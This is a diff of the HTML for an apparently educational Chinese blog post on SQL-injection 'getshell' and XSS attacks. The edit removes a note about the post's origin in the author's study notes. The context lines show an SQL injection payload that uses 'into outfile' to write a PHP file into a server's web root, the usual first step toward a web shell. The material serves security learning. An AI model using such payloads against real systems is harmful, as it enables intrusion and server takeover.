@@ -114,10 +114,7 @@
         <figure class="article__cover reveal"><img src="/medias/featureimages/21.jpg" alt="SQL 注入 Getshell 与 XSS 跨站脚本攻击" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
       
       <div class="post-content reveal">
-        <blockquote>
-<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
-</blockquote>
-<span id="more"></span>
+        <span id="more"></span>
 
 <h2 id="1-into-outfile-导出文件"><a href="#1-into-outfile-导出文件" class="headerlink" title="1 into outfile 导出文件"></a>1 into outfile 导出文件</h2><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p><code>-1&#39; union select &quot;&lt;?php phpinfo();?&gt;&quot;,2 into outfile &quot;/var/www/html/han.php&quot;#</code></p>
 <p> 解释：把 字符串保存到<code> /var/www/html/han.php</code> 文件中</p>
